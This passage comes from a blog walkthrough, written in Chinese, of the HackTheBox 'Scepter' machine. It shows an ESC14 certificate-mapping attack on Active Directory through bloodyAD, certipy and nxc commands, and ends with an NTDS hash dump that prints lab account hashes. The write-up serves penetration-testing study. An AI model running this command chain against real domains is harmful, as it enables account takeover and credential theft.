+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute20: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute19: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute18: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute17: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute16: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute15: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute14: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute13: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute12: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute11: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute10: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute9: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute8: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute7: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute6: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute5: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute4: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute3: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute2: WRITE
+</span></span><span style="display:flex;"><span>msDS-cloudExtensionAttribute1: WRITE
+</span></span><span style="display:flex;"><span>msDS-GeoCoordinatesLongitude: WRITE
+</span></span><span style="display:flex;"><span>msDS-GeoCoordinatesLatitude: WRITE
+</span></span><span style="display:flex;"><span>msDS-GeoCoordinatesAltitude: WRITE
+</span></span><span style="display:flex;"><span>msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
+</span></span><span style="display:flex;"><span>msPKI-CredentialRoamingTokens: WRITE
+</span></span><span style="display:flex;"><span>msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
+</span></span><span style="display:flex;"><span>msDS-FailedInteractiveLogonCount: WRITE
+</span></span><span style="display:flex;"><span>msDS-LastFailedInteractiveLogonTime: WRITE
+</span></span><span style="display:flex;"><span>msDS-LastSuccessfulInteractiveLogonTime: WRITE
+</span></span><span style="display:flex;"><span>msDS-SupportedEncryptionTypes: WRITE
+</span></span><span style="display:flex;"><span>msPKIAccountCredentials: WRITE
+</span></span><span style="display:flex;"><span>msPKIDPAPIMasterKeys: WRITE
+</span></span><span style="display:flex;"><span>msPKIRoamingTimeStamp: WRITE
+</span></span><span style="display:flex;"><span>mSMQDigests: WRITE
+</span></span><span style="display:flex;"><span>mSMQSignCertificates: WRITE
+</span></span><span style="display:flex;"><span>userSharedFolderOther: WRITE
+</span></span><span style="display:flex;"><span>userSharedFolder: WRITE
+</span></span><span style="display:flex;"><span>url: WRITE
+</span></span><span style="display:flex;"><span>otherIpPhone: WRITE
+</span></span><span style="display:flex;"><span>ipPhone: WRITE
+</span></span><span style="display:flex;"><span>assistant: WRITE
+</span></span><span style="display:flex;"><span>primaryInternationalISDNNumber: WRITE
+</span></span><span style="display:flex;"><span>primaryTelexNumber: WRITE
+</span></span><span style="display:flex;"><span>otherMobile: WRITE
+</span></span><span style="display:flex;"><span>otherFacsimileTelephoneNumber: WRITE
+</span></span><span style="display:flex;"><span>userCert: WRITE
+</span></span><span style="display:flex;"><span>homePostalAddress: WRITE
+</span></span><span style="display:flex;"><span>personalTitle: WRITE
+</span></span><span style="display:flex;"><span>wWWHomePage: WRITE
+</span></span><span style="display:flex;"><span>otherHomePhone: WRITE
+</span></span><span style="display:flex;"><span>streetAddress: WRITE
+</span></span><span style="display:flex;"><span>otherPager: WRITE
+</span></span><span style="display:flex;"><span>info: WRITE
+</span></span><span style="display:flex;"><span>otherTelephone: WRITE
+</span></span><span style="display:flex;"><span>userCertificate: WRITE
+</span></span><span style="display:flex;"><span>preferredDeliveryMethod: WRITE
+</span></span><span style="display:flex;"><span>registeredAddress: WRITE
+</span></span><span style="display:flex;"><span>internationalISDNNumber: WRITE
+</span></span><span style="display:flex;"><span>x121Address: WRITE
+</span></span><span style="display:flex;"><span>facsimileTelephoneNumber: WRITE
+</span></span><span style="display:flex;"><span>teletexTerminalIdentifier: WRITE
+</span></span><span style="display:flex;"><span>telexNumber: WRITE
+</span></span><span style="display:flex;"><span>telephoneNumber: WRITE
+</span></span><span style="display:flex;"><span>physicalDeliveryOfficeName: WRITE
+</span></span><span style="display:flex;"><span>postOfficeBox: WRITE
+</span></span><span style="display:flex;"><span>postalCode: WRITE
+</span></span><span style="display:flex;"><span>postalAddress: WRITE
+</span></span><span style="display:flex;"><span>street: WRITE
+</span></span><span style="display:flex;"><span>st: WRITE
+</span></span><span style="display:flex;"><span>l: WRITE
+</span></span><span style="display:flex;"><span>c: WRITE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>p.adams,OU<span style="color:#f92672">=</span>Helpdesk Enrollment Certificate,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>altSecurityIdentities: WRITE
+</span></span></code></pre></div><p>这个p.adams用户能打dcsync</p>
+<p><img src="/scepter/image-5.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>很明了了，能写altSecurityIdentities就意味着能重新打一次esc14</p>
+<p>查看一下这个用户是否存在altSecurityIdentities</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $FQDN -d scepter.htb -k get object p.adams --attr altSecurityIdentities 
+</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>p.adams,OU<span style="color:#f92672">=</span>Helpdesk Enrollment Certificate,DC<span style="color:#f92672">=</span>scepter,DC<span style="color:#f92672">=</span>htb
+</span></span></code></pre></div><p>不存在，给它写一个，注意这里其实能随意写，只要后面能正常对应就行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $FQDN -d $domain -k set object p.adams altSecurityIdentities -v <span style="color:#e6db74">&#39;X509:&lt;RFC822&gt;wackymaker@scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> p.adams<span style="color:#960050;background-color:#1e0010">&#39;</span>s altSecurityIdentities has been updated
+</span></span></code></pre></div><p>之后和之前一样的打法</p>
+<p>因为环境恢复脚本的原因,前面的部分操作我需要重复操作</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 add genericAll <span style="color:#e6db74">&#34;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&#34;</span> a.carter
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> a.carter has now GenericAll on OU<span style="color:#f92672">=</span>STAFF ACCESS CERTIFICATE,DC<span style="color:#f92672">=</span>SCEPTER,DC<span style="color:#f92672">=</span>HTB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD --host $FQDN -d $domain -k set object p.adams altSecurityIdentities -v <span style="color:#e6db74">&#39;X509:&lt;RFC822&gt;wackymaker@scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> p.adams<span style="color:#e6db74">&#39;s altSecurityIdentities has been updated
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 set object d.baker mail -v wackymaker@scepter.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] d.baker&#39;</span>s mail has been updated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy req -username d.baker@scepter.htb -hashes :$hash -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip $ip
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate without identity
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try using -sid to set the object SID or see the wiki <span style="color:#66d9ef">for</span> more details
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;d.baker.pfx&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;d.baker.pfx&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy auth -pfx d.baker.pfx -dc-ip $ip -domain scepter.htb -username p.adams
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     No identities found in this certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find identity in the provided certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;p.adams@scepter.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;p.adams.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;p.adams.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;p.adams&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;p.adams@scepter.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
+</span></span></code></pre></div><p>成功获取管理权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb -dc-ip $ip -u p.adams -H 1b925c524f447bb821a8789c4b118ce0 --ntds
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> y
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:scepter.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> c-ip<span style="color:#ae81ff">\p</span>.adams:1b925c524f447bb821a8789c4b118ce0 
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping the NTDS, this could take a <span style="color:#66d9ef">while</span> so go grab a redbull...
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             scepter.htb<span style="color:#ae81ff">\d</span>.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             scepter.htb<span style="color:#ae81ff">\a</span>.carter:1107:aad3b435b51404eeaad3b435b51404ee:656d231c131a8f1ea8fd1138b8185674:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             scepter.htb<span style="color:#ae81ff">\h</span>.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             scepter.htb<span style="color:#ae81ff">\p</span>.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             scepter.htb<span style="color:#ae81ff">\e</span>.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             scepter.htb<span style="color:#ae81ff">\o</span>.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             scepter.htb<span style="color:#ae81ff">\M</span>.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumped <span style="color:#ae81ff">11</span> NTDS hashes to /home/wackymaker/.nxc/logs/ntds/10.129.103.0_None_2025-09-01_163758.ntds of which <span style="color:#ae81ff">10</span> were added to the database
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> To extract only enabled accounts from the output file, run the following command: 
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> cat /home/wackymaker/.nxc/logs/ntds/10.129.103.0_None_2025-09-01_163758.ntds | grep -iv disabled | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1
+</span></span><span style="display:flex;"><span>SMB         10.129.103.0    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> grep -iv disabled /home/wackymaker/.nxc/logs/ntds/10.129.103.0_None_2025-09-01_163758.ntds | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1
+</span></span></code></pre></div><p>登陆就能拿到flag了，我今天赶时间去网吧，文章就写到这里</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/htb/">Htb</a>
+        
+            <a href="/tags/domain/">Domain</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/aircrack/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">aircrack-ng套件</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ufo/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">UFO-1-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/wifiinterfaces/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">wifi网卡简记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/phantom-check/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Phantom-check-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sweep-htb/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sweep-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
